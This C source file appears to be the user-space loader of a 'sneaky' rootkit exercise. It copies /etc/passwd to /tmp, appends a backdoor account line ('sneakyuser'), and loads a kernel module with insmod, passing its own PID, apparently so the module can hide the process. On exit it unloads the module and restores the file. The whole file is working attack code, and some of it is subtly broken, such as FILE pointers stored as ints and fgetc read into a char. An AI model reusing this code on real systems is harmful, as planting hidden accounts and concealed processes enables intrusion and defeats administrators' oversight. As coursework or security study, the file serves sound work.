#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <errno.h>

int passwd();
int attack();
void fin();

int main (int argc, char *argv[]) {
  if (attack() != 0) {
    exit(EXIT_FAILURE);
  }
  char in;
  while ((in = getc(stdin)) != 'q') {
    printf(">>>");
  }
  fin();
  return 0;
}

int passwd() {
  int fd1, fd2;
  int err;
  char c;

  fd1 = fopen("/etc/passwd", "r");
  fd2 = fopen("/tmp/passwd", "w");

  if ( (fd1 < 0) || (fd2 < 0) ) {
    printf("Error: Failed to open /.../passwd\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    c = fgetc( fd1 );
    if (c == EOF) break;
    fputc( c, fd2 );
  }
  fclose(fd1);
  fclose(fd2);

  int fd3 = fopen("/etc/passwd", "a");
  if ( fd3 < 0 ) {
    printf("Error: Failed to append /etc/passwd\n");
  }
  char str[256] = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(fd3, "%s", str);
  fclose(fd3);

  return 0;
}

int attack() {
  if ( passwd() != 0 ) {
    return -1;
  }

  pid_t pid;
  pid_t wpid;
  int status;
  pid = fork();
  if (pid == 0) {
    int sneaky_id = getppid();
    char buf[128];
    sprintf(buf, "sneaky_pid=%d", sneaky_id);
    printf("sneaky_process pid = %d\n", sneaky_id);
    execlp("insmod", "insmod", "sneaky_mod.ko", buf, NULL);
  } else {
    wpid = waitpid(pid, &status, WUNTRACED);
  }
  
  return 0;
}

void fin() {
  pid_t pid;
  pid_t wpid;
  int status;
  pid = fork();
  if (pid == 0) {
    execlp("rmmod", "rmmod", "sneaky_mod.ko", NULL);
  }else{
    wpid = waitpid(pid, &status, WUNTRACED);
    if (WIFEXITED(status)) {
      printf("%s, %d\n", "program exited with status", WEXITSTATUS(status));
    }
    if (WIFSIGNALED(status)) {
      printf("%s, %d\n", "program was killed by signal", WTERMSIG(status));
    }
  }
  int fd1, fd2;
  int err;
  char c;

  fd1 = fopen("/tmp/passwd", "r");
  fd2 = fopen("/etc/passwd", "w");

  if ( (fd1 < 0) || (fd2 < 0) ) {
    printf("Error: Failed to open /.../passwd\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    c = fgetc( fd1 );
    if (c == EOF) break;
    fputc( c, fd2 );
  }
  fclose(fd1);
  fclose(fd2);
}
